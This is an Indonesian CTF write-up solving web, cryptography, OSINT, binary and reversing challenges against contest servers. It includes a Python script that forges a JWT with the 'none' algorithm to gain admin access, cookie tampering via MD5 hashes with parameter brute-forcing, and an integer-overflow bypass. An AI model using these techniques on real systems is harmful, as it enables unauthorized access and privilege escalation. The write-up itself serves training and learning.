# CSC CTF Contest WriteUP
**DAFTAR ISI** :
- Web Exploitation
  - [robotImpact](https://github.com/ImJoke/CTF/edit/main/CSC%20CTF%20Contest.md#robotimpact)
  - [MainT](https://github.com/ImJoke/CTF/edit/main/CSC%20CTF%20Contest.md#maint)
- Cryptography
  - [Xorror](https://github.com/ImJoke/CTF/blob/main/CSC%20CTF%20Contest.md#xorror)
  - [ROTaeno](https://github.com/ImJoke/CTF/blob/main/CSC%20CTF%20Contest.md#rotaeno)
- OSINT
  - [Semua Yang Ingin Saya Lakuan](https://github.com/ImJoke/CTF/blob/main/CSC%20CTF%20Contest.md#semua-yang-ingin-saya-lakukan)
- Binary Exploitation
  - [VVS my diamond](https://github.com/ImJoke/CTF/blob/main/CSC%20CTF%20Contest.md#vvs-my-diamond)
  - [Astral Express Oddysey](https://github.com/ImJoke/CTF/blob/main/CSC%20CTF%20Contest.md#astral-express-oddysey)
- Reverse Engineering
  - [ESREVER](https://github.com/ImJoke/CTF/blob/main/CSC%20CTF%20Contest.md#esrever)

* * *

## Web Exploitation
- ### robotImpact

#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/robotImpact.png" width=425>
<br>

Karena judulnya mengandung kata `robot` jadi awalnya saya coba-coba untuk mencari file [robots.txt](http://103.185.44.232:1507/robots.txt), karena saya pikir itu adalah sebuah clue. Kemudian saya menemukan text ini
```txt
User-agent: *
Disallow: /WangshengFuneralParlor/chamber.php
Disallow: /WangshengFuneralParlor/tips.txt
```
<br>

[Di sini](http://103.185.44.232:1507/WangshengFuneralParlor/tips.txt) terdapat teks yang isinya adalah:
```
Kamu nyari tips? tipsnya adalah... baca deskripsi dengan sangat amat teliti
```
<br>

Lalu saya menyadari kalau terdapat cookie dengan nama `entity` yang berisikan nilai `87b7cb79481f317bde90c116cf36084b`

Lalu setelah saya menggunakan [hash identifier](https://hashes.com/en/tools/hash_identifier) diketahuilah bahwa itu merupakan nilai dari hash md5 yang dimana nilainya adalah `robot`

Lalu saya coba untuk mengubah isi cookienya menjadi `a0e6535a553765a9ba99bd27f85ded73` yang artinya adalah `zhongli`, lalu saya tinggal melakukan refresh terhadap websitenya dan saya di arahkan ke [sini](http://103.185.44.232:1507/InnerChamber/vault.php)
<br><br>
<img width="720" alt="InnerChamber_vault" src="https://github.com/ImJoke/CTF/assets/55929550/17baa669-3f02-4e78-8800-ce73a06a054f">
<br><br>
Saya melihat sepertinya vault.php menerima sebuah paramater berupa box dimana tipenya haruslah sebuah angka, jadi saya ingin coba bagaimana kalau saya memberikan sebuah string dan inilah [outputnya](http://103.185.44.232:1507/InnerChamber/vault.php?box=asd)
<br><br>
<img width="333" alt="InnerChamber_vault_box" src="https://github.com/ImJoke/CTF/assets/55929550/8ba2052e-9a61-4c6e-ac5e-528d361c0b9c">
<br><br>
Oke disini diketahui bahwa ada total 1000 kotak, maka saya membuat sebuah script untuk mendapatkan flagnya


```py
import requests

cookies = {
    'entity': 'a0e6535a553765a9ba99bd27f85ded73',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh;q=0.5,ja-JP;q=0.4,ja;q=0.3',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}
response1 = requests.get(f'http://103.185.44.232:1507/InnerChamber/vault.php?box=1', cookies=cookies, headers=headers, verify=False)

for i in range(1000):
    response = requests.get(f'http://103.185.44.232:1507/InnerChamber/vault.php?box={i}', cookies=cookies, headers=headers, verify=False)
    if response1.text != response.text:
        print(response.text, i)
        break
```
<br>

Lalu setelah menunggu, didapatkanlah sebuah output berupa
```
            <h1>if(isset($_GET["box"]) && $_GET["box"] == someNumber)</h1>
            <p><a href='scroll.txt'>scroll on the wall</a></p>
                <script>alert('sepertinya kotak hanya kotak ini yang berisi');</script><p>Flag: CSC{m4ff_b4nh_z0ngl1_t3rny4ta_k4mu_buk4n_rob0t}</p>        </div>
    </body>
```

Flag : [**CSC{m4ff_b4nh_z0ngl1_t3rny4ta_k4mu_buk4n_rob0t}**](http://103.185.44.232:1507/InnerChamber/vault.php?box=157)
<br><br>

- ### MainT
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/MainT.png" width=425>
<br>

Jadi awalnya saya login ke web tersebut dengan menggunakan credential `guest12345:password123`, lalu saya menyadari bahwa web tersebut menggunakan jwt token karena setelah saya cek terdapat cookie bernama `dG9rZW4` dengan value `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0MTIzNDUiLCJhY2Nlc3MiOiJndWVzdCJ9.JflcACIq8Xys_-HmbPnHdNuzgpXVsuNkjPvEVbyu7eI`

Setelah saya menggunakan hash [identifier](https://hashes.com/en/tools/hash_identifier) diketahui bahwa value tersebut merupakan hash dari jwt token

Selanjutnya saya mencari di google cara untuk [mendecode](https://jwt.io) nilai dari jwt token itu, dan saya mendapatkan nilai seperti ini
<br><br>
<img width="1053" alt="MainT_jwt_token" src="https://github.com/ImJoke/CTF/assets/55929550/361dbc8c-8cdb-4d49-ab19-fe0a80a6a14d">
<br><br>

Selanjutnya saya menggunakan scriipt dari [ctf-jwt-token](https://github.com/gluckzhang/ctf-jwt-token) yang saya modifikasi untuk membuat ulang jwt tokennya, berikut scriptnya
<br>
```py
#!/usr/bin/python
# -*- coding:utf-8 -*-

import os, sys, requests, jwt
import logging
from optparse import OptionParser, OptionGroup

__version__ = "0.1"

# nicely parse the command line arguments
def parse_options():
    usage = r'usage: python3 %prog [options] -l LOGIN_URL -u USERNAME -p PASSWORD'
    parser = OptionParser(usage = usage, version = __version__)
    parser.add_option('-l', '--url',
        action = 'store',
        type = 'string',
        dest = 'url',
        help = 'The POST request url to login the website.'
    )
    parser.add_option('-u', '--username',
        action = 'store',
        type = 'string',
        dest = 'username',
        help = 'The username used to login.'
    )
    parser.add_option('-p', '--password',
        action = 'store',
        type = 'string',
        dest = 'password',
        help = 'The password used to login.'
    )
    options, args = parser.parse_args()
    if options.url == None or options.username == None or options.password == None:
        parser.print_help()
        parser.error("Missing options.")
    return options

def main():
    options = parse_options()
    # a default user-agent which is used to login the website
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36"}
    # the login parameters
    loginparams = {"username": options.username, "password": options.password}
    session_requests = requests.session() # by using session(), we are able to handle http cookies, which is used to save the jwt token
    login_result = session_requests.post(options.url, data = loginparams, headers = headers) # send a post request to login the website

    if login_result.status_code == 200:
        # successfully login the website
        private_page_url = login_result.url # now the user should be redirected to a restricted page, which has different contents for different roles

        for cookie in session_requests.cookies:
            if cookie.name == "dG9rZW4":
                jwttoken = cookie.value # extract the jwt token string

                logging.info("successfully detect a jwt token: %s\n"%jwttoken)



                header = jwt.get_unverified_header(jwttoken) # get the jwt token header, figure out which algorithm the web server is using
                logging.info("jwt token header: %s\n"%header)
                payload = jwt.decode(jwttoken, options={
                                     "verify_signature": False})
                # decode the jwo token payload, the user role information is claimed in the payload

                logging.info("jwt token payload: %s\n"%payload)

                payload["username"] = "CSCAdmin"
                payload["access"] = "admin"
                fake_jwttoken = jwt.encode(payload, None, algorithm="none") # update the user role and regenerate the jwt token using "none" algorithm
                logging.info("regenerate a jwt token using 'none' algorithm and changing the role into 'admin'")
                logging.info(fake_jwttoken + "\n")
                cookie.value = fake_jwttoken
                break

        flag_page = session_requests.get(private_page_url, headers = headers) # let's visit the restricted page again

        logging.info("\n" + flag_page.text + "\n") # now the webpage should contain the flag information

        logging.info("Yeah, now we successfully login as admin!")
    else:
        logging.error("Failed to login the website, please check the options.")
        sys.exit(1)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()
```
<br>

Yang dimana saya hanya mengubah dan menambahkan
```py
if cookie.name == "dG9rZW4":
payload["username"] = "CSCAdmin"
payload["access"] = "admin"
```
<br>

Lalu tinggal jalankan saja filenya
```sh
python give_me_the_flag.py -l http://103.185.44.232:29342/index.php -u guest12345 -p password123
```
<br>

Kemudian diperoleh text berupa
```html
<body>
    <h1>Access granted for Administrator -->13<--</h1>
    <p class='flag'>Here's the flag: CSC{gu1f_Wjg_1f_3kgERz3yl_ihya3eNoy3_e1tug?}</p>
</body>
```
<br>

Sepertinya flagnya masih terencrypt, maka saya coba untuk mendecrypt menggunakan [ROT decryptor](https://theblob.org/rot.cgi)
<br>
ROT-13: th1s_Jwt_1s_3xtREm3ly_vuln3rAbl3_r1ght?
<br><br>
FLAG : **CSC{th1s_Jwt_1s_3xtREm3ly_vuln3rAbl3_r1ght?}**
<br><br><br>

## Cryptography
- ### Xorror
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/Xorror.png" width=425>
<br>

<details>
  <summary>Isi file chall.py</summary>

```py
import random
import re

flag = open('flag.txt','rb').read()
assert len(flag) == 44 and flag.startswith(b"CSC{"), "Hello! in case you didn't know, you are not supposed to run this script directly. You are given this script and the output of this script (output.txt). Your goal is to recover the flag.txt file based on the given output. Good luck!"

key = random.randint(1,255)

enc = []
enc.append(flag[0] ^ key)
for i in range(1, len(flag)):
    enc.append(flag[i] ^ flag[i-1])

f = open('output.txt','w')
f.write(str(enc))
f.write('\n')
f.close()
```
</details>

Lalu karena chat gpt exist, maka tinggal saya suruh saja dia untuk membuatkan decoder terhadap file `chall.py` itu, berikut kodenya
<br>
```py
with open('output.txt', 'r') as f:
    enc = eval(f.read())

key = enc[0] ^ ord('C')
flag = [key ^ enc[0]]
for i in range(1, len(enc)):
    flag.append(enc[i] ^ flag[i-1])

flag = ''.join([chr(c) for c in flag])
print(flag)
```
Thanks to LazyKae, jadi bisa bikin alasan wkwk : 
<br>
<img width="262" alt="image" src="https://github.com/ImJoke/CTF/assets/55929550/e25ead5e-cb17-4fe8-a3f4-b82e7e104962">
<br>

FLAG : **CSC{wh47_1s_y0ur_f4VvVvVv0r173_x0rr0r_m0v13}**
<br><br>

- ### ROTaeno
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/ROTaeno.png" width=425>
<br>

Diberikan dua buah file, welcome.txt dan district.zip
<details>
  <summary>Isi file Welcome.txt</summary>

  ```txt
Jrypbzr gb EBGnrab!
Va gur pvgl bs Unezbavn, erabjarq sbe vgf unezbavbhf zrybqvrf, na napvrag negvsnpg pnyyrq gur "Zrybql Fgbar" unf orra fgbyra. Gur Zrybql Fgbar cbffrffrf vzzrafr cbjre naq pna bayl or npgvingrq ol qrpelcgvat n frevrf bs zhfvpny pbqrf uvqqra jvguva rapelcgrq zrffntrf.

Nf gur cebgntbavfg, lbh ner n gnyragrq pelcgbtencure naq zhfvpny cebqvtl. Lbh erprvir n qvfgerff pnyy sebz gur pvgl'f nhgubevgvrf, frrxvat lbhe uryc va erpbirevat gur fgbyra Zrybql Fgbar orsber vg snyyf vagb gur jebat unaqf.

Lbhe zvffvba vf gb geniry guebhtu inevbhf qvfgevpgf bs gur pvgl, rnpu nffbpvngrq jvgu n qvssrerag traer bs zhfvp, naq qrpbqr gur rapelcgrq zrffntrf hfvat gur EBGnrab (pnrfne) pvcure.

Gb erpbire gur Zrybql Fgbar, lbh zhfg qrpvcure na vapernfvatyl pbzcyrk rapelcgrq zrffntrf, Svaq gur pbqr jvguva gur rapelcgrq zrffntr, naq haybpx gur cbjre bs gur Zrybql Fgbar va gur urneg bs gur pvgl.

Gur sngr bs gur pvgl naq gur cbjre bs gur Zrybql Fgbar yvr va lbhe unaqf. Jvyy lbh or noyr gb qrpbqr gur rapelcgrq zrffntrf, erfgber unezbal, naq fnir gur qnl?

Hamvc gur nggnpuzragf tvira jvgu gur cnffjbeq "SBE GUR ZRYBQL FGBAR" jvgubhg gur dhbgrf

Nsgre hapbirevat gur frperg pbqr, haybpx gur cbjre bs gur Zrybql Fgbar ng gur urneg bs gur pvgl ol pbaarpgvat gb n argpng orybj:

103.185.44.232 4321
```
</details>

<details>
  <summary> Yang isinya setelah saya decrypt menggunakan ROT13 decryptor adalah </summary>

  ```txt
Welcome to ROTaeno!
In the city of Harmonia, renowned for its harmonious melodies, an ancient artifact called the "Melody Stone" has been stolen. The Melody Stone possesses immense power and can only be activated by decrypting a series of musical codes hidden within encrypted messages.
As the protagonist, you are a talented cryptographer and musical prodigy. You receive a distress call from the city's authorities, seeking your help in recovering the stolen Melody Stone before it falls into the wrong hands.
Your mission is to travel through various districts of the city, each associated with a different genre of music, and decode the encrypted messages using the ROTaeno (caesar) cipher.
To recover the Melody Stone, you must decipher an increasingly complex encrypted messages, Find the code within the encrypted message, and unlock the power of the Melody Stone in the heart of the city.
The fate of the city and the power of the Melody Stone lie in your hands. Will you be able to decode the encrypted messages, restore harmony, and save the day?
Unzip the attachments given with the password "FOR THE MELODY STONE" without the quotes
After uncovering the secret code, unlock the power of the Melody Stone at the heart of the city by connecting to a netcat below:
103.185.44.232 4321
```
</details>

Diketahui bahwa kata sandi untuk file district.zip adalah `FOR THE MELODY STONE`, setelah saya extract terdapat 3 file 

```cmd
 Directory of C:\Users\REDACTED\Downloads\district\City of Harmonia

21/07/2023  10:55    <DIR>          .
21/07/2023  10:53    <DIR>          ..
21/07/2023  10:55               689 1. Rhythm Avenue.txt
21/07/2023  10:55               614 2. Otaku Oasis.txt
21/07/2023  10:55               862 3. Symphony Square.txt
```
<br>

Tiap file tersebut berisikan sebuah teks yang telah di encrypt dengan XOR cipher, berikut isinya

<details>
  <summary>Isi file "1. Rhythm Avenue.txt"</summary>

```txt
You arrive at the Rhythm Avenue. The district pulsates with vibrant neon lights, and its streets are alive with the infectious beats of EDM. Clubs, DJs, and dancers fill the air with their energetic rhythms.
The Melody Stone have left a clue for the secret code for activating the true power of the Melody Stone that only a true musician (and cryptographer) can solve.
By decoding the message below, you will find a title for a popular EDM music, find the artist of the song, and the part of the secret code will be the fourth and the sixth character of the artist name (for example, if the artist name is cipichop, then the part of the secret code will be "ih")
Bhvkxurbv [WLB Anunjbn]
```
</details>

Saya menggunakan https://theblob.org/rot.cgi untuk mengetahui apa nilai sebenarnya dari ROT cipher tersebut, yang isinya adalah `Symbolism [NCS Release]`.
Setelah saya cari di google diketahuilah bahwa artis dari lagu tersebut adalah `Electro-Light`, dimana huruf ke 4 dan ke 6 dari nama artis tersebut adalah `cr`

<details>
  <summary>Isi file "2. Otaku Oasis.txt"</summary>

```txt
Otaku Oasis is a vibrant district dedicated to anime and Vocaloid culture. Cosplayers roam the streets, and the air is filled with catchy tunes from popular anime series and Vocaloid idols.
The Melody Stone have left a clue for the secret code for activating the true power of the Melody Stone that only a true musician (and cryptographer) can solve.
Below are blocks of encrypted messages, each block is encrypted with different ROTation strength, you will find the part of the secret code after decoding the whole message (each block is a valid english text)
MaxLxvkxmVhwx
QaBpmTiabJtwks
RghesdcCnvmAxNmd
zquv
```
</details>

Yang dimana tiap block tersebut berarti
```txt
ROT-7: MaxLxvkxmVhwx -> TheSecretCode
ROT-18: QaBpmTiabJtwks  -> IsTheLastBlock
ROT-1: RghesdcCnvmAxNmd -> ShiftedDownByOne
ROT-25: zquv -> yptu
```


Dan di file yang ke tiga berisikan teks

<details>
  <summary>Isi file "3. Symphony Square.txt"</summary>

  ```txt
Symphony Square is an elegant district steeped in the grandeur of classical music. Ornate concert halls and talented orchestras enchant visitors with masterpieces composed by the great classical maestros.
The Melody Stone have left a clue for the secret code for activating the true power of the Melody Stone that only a true musician (and cryptographer) can solve.
Here are several encrypted messages, after decoding each message, you must find the name of the composer that relates to each messages. The part of the secret code is the first letter of the first name of each composer (for example, if the composer that you found is Ludwig van Beethoven, Wolfgang Amadeus Mozart, and Johann Sebastian Bach, then the secret code is "lwj")
Ioljkw ri wkh Expeohehh
Zbkklusf h tpza mlss myvt tf lflz huk P ruld aol dhf P ohk av ahrl
1 Bqsjm 1873, Opwhpspe, Svttjb
```
</details>

Yang dimana tiap block itu berarti
```txt
ROT-23: Ioljkw ri wkh Expeohehh -> Flight of the Bumblebee
ROT-19: Zbkklusf h tpza mlss myvt tf lflz huk P ruld aol dhf P ohk av ahrl -> Suddenly a mist fell from my eyes and I knew the way I had to take
ROT-25: 1 Bqsjm 1873, Opwhpspe, Svttjb -> 1 April 1873, Novgorod, Russia
```
<br>

Lalu saya mendapatkan 3 nama yaitu `Nikolai Rimsky-Korsakov`, `Edvard Grieg`, `Sergei Rachmaninoff` yang dimana menghasilkan secret code berupa `nes`.
Lalu saya menggabungkan ketiga secret code itu menjadi satu, dan di dapatkanlah `cryptunes`, lalu tinggal masukkan secret codenya ke `103.185.44.232 4321`

```sh
nc 103.185.44.232 4321

You are at a very sacred room at the heart of the city, to activate the power of the Melody Stone, you must uncover the secret of the perfect melody, what is the perfect melody? (submit your answer in all UPPERCASE)
CRYPTUNES
You have activated the Melody Stone, the Melody Stone shines a very bright beacon indicating its location, the Melody Stone is shortly discovered, and now you have proven yourself worthy of the power of the Melody Stone.

After resonating with the Melody Stone, A string(flag) filled within your mind.
CSC{the_melody_stone_is_the_friendship_we_made_along_the_way}
```
<br>

FLAG : **CSC{the_melody_stone_is_the_friendship_we_made_along_the_way}**
<br><br><br>

## OSINT
- ### Semua Yang Ingin Saya Lakukan
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/Semua%20Yang%20Ingin%20Saya%20Lakukan.png" width=425>
<br>

Jadi awalnya diberikan file zip bernama SYISL.zip yang berisikan 2 buah file, 1.jpg dan 2.txt

<details>
  <summary>Isi file 1.jpg</summary>

  ![1](https://github.com/ImJoke/CTF/assets/55929550/da627f50-0695-4d67-87ab-98db0043d827)
</details>

<details>
  <summary>Isi file 2.txt</summary>

  ```txt
My name is Rene and I used to be a fan of this all-male K-Pop band that was disbanded a few years ago. To commemorate it, I want to go to one of their locations that was posted on their social media. Can you help me find it?
1. Which city is the monument located in?
2. When was it posted?
3. I put something special in the comments, go check it out!


Format: CSC{City_DDMMYY_special}


e.g: City is Jakarta, date is 1 March 2010, special is a1b2c3 then the flag is CSC{Jakarta_010310_a1b2c3}
```
</details>

Jadi saya disuruh untuk mencari flag dengan format CSC{City_DDMMYY_Special}

Oke pertama saya menggunakan yandex untuk melakukan pengecekan, dan diketahuilah sepertinya foto tersebut berasal dari Korea Selatan
<br><br>
<img width="631" alt="Semua_Yang_Ingin_Saya_Lakukan_yandex" src="https://github.com/ImJoke/CTF/assets/55929550/fb6f018a-e2fd-404d-9111-385463aca163">
<br>

Setelah itu saya melakukan translate terhadap teks yang terdapat disana
<br><br>
<img width="496" alt="Semua_Yang_Ingin_Saya_Lakukan_translate" src="https://github.com/ImJoke/CTF/assets/55929550/fb02dccd-551d-49c9-b2ca-84eb25d3d8ac">
<br>

Sepertinya foto itu berada di depan Gocheok Dome baseball statue
<br><br>
<img width="608" alt="Semua_Yang_Ingin_Saya_Lakukan_gocheok_dome" src="https://github.com/ImJoke/CTF/assets/55929550/6d9279e9-f091-485f-a098-b7ae05e94fba">
<br>

Oke sudah diketahui bahwa kotanya berada di **Seoul**, selanjutnya saya coba untuk mencari tanggal foto itu di upload
<br><br>
<img width="152" alt="Semua_Yang_Ingin_Saya_Lakukan_date" src="https://github.com/ImJoke/CTF/assets/55929550/34e88ef4-90ac-4261-9151-8fdb86f86c8c">
<br>

Jadi tanggalnya adalah **241218**, lalu saya coba untuk mencari retweet terbaru pada foto itu
<br><br>
<img width="465" alt="Semua_Yang_Ingin_Saya_Lakukan_retweet" src="https://github.com/ImJoke/CTF/assets/55929550/0bef05eb-2ade-4820-835d-5fb52dda3919">
<br>

Sepertinya ini adalah retweet yang paling baru, jadi saya coba cek siapa yang meretweet pesan itu
<br><br>
<img width="464" alt="Semua_Yang_Ingin_Saya_Lakukan_special" src="https://github.com/ImJoke/CTF/assets/55929550/bae7731d-7afc-415c-97c2-94c1ee6fa2c0">
<br>

Dan spesial codenya adalah `ar3y0uw4nn4bl3`
<br>

FLAG : **CSC{Seoul_241218_ar3y0uw4nn4bl3}**
<br><br><br>

## Binary Exploitation
- ### VVS my diamond 
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/VVS%20my%20diamond.png" width=425>
<br>

Diberikan sebuah file dengan nama rumput.c dan netcat address `103.185.44.232 7979`

```c
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

void nuller(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

int main(){
    nuller();

    char flag[32];
    FILE *f;
    if ((f = fopen("flag.txt", "r")) == NULL){
        printf("gak ada apa apa");
        exit(1);
    }

    int input;
    printf("nct ");
    scanf("%d", &input);

    int nct = (2*input)+1;

    if (input == -64) {
        printf("gaboleh pake cara nct %d ini >!!<\n", nct);
        exit(0);
    } 
    
    if(nct == -127){
        printf("yey akhirnya ketemu nct %d !!!\n", nct);
        fscanf(f, "%s", flag);
        printf("%s", flag);

    } else if (nct < 0){
        printf("mana ada nct %d itu \n", nct);
        
    } else {
        printf("gak ada loch nct %d ini \n", nct);
        
    }

    exit(0);
}
```

Setelah membaca program itu saya mengetahui bahwa `2x+1 = -127`

Dimana `x = -64`, namun karena terdapat kondisi `if (input == -64)` maka saya tidak bisa menggunakan cara itu. Lalu saya ada ide lain, bagaimana kalau menggunakan teknik overflow

Diketahui bahwa integer hanya mampu menampung 2147483647 dan jika di tambah 1 maka akan menjadi -2147483648, selanjutnya saya gunakan kalkulator untuk mencari nilai jika 

```
-2147483648 + x = -64
x = 2147483584
```

Jadi kalau kita masukkan 2147483584 maka hasilnya akan menjadi `(2*2147483584) + 1 = 4294967169` yang dimana 4294967169 akan menjadi
```
4294967169 - 2^32 = 4294967169 - 4294967296 = -127
```

Maka nilai overflownya akan menjadi -127

<img width="160" alt="vvs_my_diamond_kali" src="https://github.com/ImJoke/CTF/assets/55929550/a254e13f-bec2-4bb9-b374-9e3edc0e14e4">
<br><br>

FLAG : **CSC{its_c4lled_underfl0w_55555555}**
<br><br>

- ### Astral Express Oddysey
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/Astral%20Express%20Oddysey.png" width=425>
<br>

Disini diberikan sebuah netcat address `103.185.44.232 1234`

<img width="400" alt="astral1" src="https://github.com/ImJoke/CTF/assets/55929550/495ea96c-8577-47c8-9a54-457a3062c12a">
<br><br>

Setelah saya explore ternyata hanya disuruh untuk chattingan dengan Himeko, namun ada beberapa hal yang harus dilakukan seperti mengubah hex value menjadi bytes

<img width="354" alt="astral2" src="https://github.com/ImJoke/CTF/assets/55929550/f35a9dbf-fa69-4e12-9cc5-b0371ebf1330">
<br><br>

Jadi saya membuat sebuah script untuk melakukan hal itu

```py
from pwn import *

conn = remote("103.185.44.232", "1234")
conn.sendline(b"2")
conn.sendline(b"2")
conn.sendline(b"1")
conn.sendline(b"3")
conn.sendline(b"1")
conn.sendline(b"1")
conn.recvuntil(b"Send the following bytes after decoded from hex: ")
hexValue = conn.recvline().decode().strip()
conn.sendline(bytes.fromhex(hexValue))

conn.recvuntil(b"Successfully manipulating space, capturing the flag...\n")
flag = conn.recvline().decode().strip()
print(flag)

```

<img width="453" alt="astral_ok" src="https://github.com/ImJoke/CTF/assets/55929550/aee7df16-1030-4ede-838b-de2638f546dc">
<br><br>

FLAG : **CSC{beep_booop_im_in_space_X_wrtichop_is_here}**
<br><br><br>

## Reverse Engineering
- ### ESREVER
#### Soal :
<img src="https://github.com/ImJoke/CTF/blob/main/assets/CSC%20CTF%20Contest/VVS%20my%20diamond.png" width=425>
<br>

Jadi diberikan sebuah file berformat zip dengan nama ReverseX.zip, lalu saya extract dan menemukan sebuah executable file bernama ReverseX.exe. Kemudian saya menggunakan Ghidra untuk melakukan decompile terhadap file tersebut
<br><br>
<img width="283" alt="reverse_1" src="https://github.com/ImJoke/CTF/assets/55929550/162c72ee-9117-4b7a-b888-ef9c63d908d0">
<br>

Setelah membaca decompiled code saya memutuskan untuk mengecek function bernama menu2
<br><br>
<img width="392" alt="reverse_2" src="https://github.com/ImJoke/CTF/assets/55929550/c3529e90-21f0-49de-ab02-429245e6f1d9">
<br>

Dapat dilihat terdapat strcmp(password, local_88) yang dimana berguna untuk melakukan pengecekan, kemudian saya penasaran apa isi dari password itu
<br><br>
<img width="162" alt="reverse_3" src="https://github.com/ImJoke/CTF/assets/55929550/b63606ec-0cf1-4dd7-a89f-43146db42ba3">
<br>

Jadi kata sandinya adalah `TheWorldIsUpsideDown`
<br><br>
<img width="858" alt="reverse_4" src="https://github.com/ImJoke/CTF/assets/55929550/d7452d6f-42e9-4f64-9f4a-f688c4955dff">
<br>

`nwoDedispUsIdlroWehT` merupakan reverse stirng dari `TheWorldIsUpsideDown`
<br>

FLAG : **CSC{3V3RytH1N9_i5_1N_r3V3r53}**
